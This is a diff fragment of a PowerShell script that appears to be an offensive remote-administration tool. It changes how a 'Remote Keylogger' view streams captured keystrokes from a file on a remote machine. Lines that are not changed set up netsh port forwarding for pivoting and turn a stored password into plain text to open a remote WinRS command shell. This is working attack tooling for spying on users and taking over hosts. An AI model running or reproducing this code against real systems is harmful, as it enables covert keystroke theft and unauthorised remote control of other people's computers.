@@ -636,10 +636,7 @@ invoke-command -session $RDP[0] -scriptblock { Set-Content -Path $env:temp\dllho
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "              Remote Keylogger " -NoNewLine -ForegroundColor Green ; Write-Host "| " -NoNewLine -ForegroundColor Gray ; Write-Host "Press 'Ctrl+C' to stop              " -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
-do { Get-Content -wait $env:localappdata\config.dat
-if ([Console]::KeyAvailable) { $key = [Console]::ReadKey($true)
-if ($key.key -eq "x") { Write-Output "You pressed 'x' to stop" ; break }}}
-until($key.key -eq "x")}}
+Try { While($True) { Get-Content -wait $env:localappdata\config.dat }} Finally { Write-Host ; Write-Host "Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}}
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
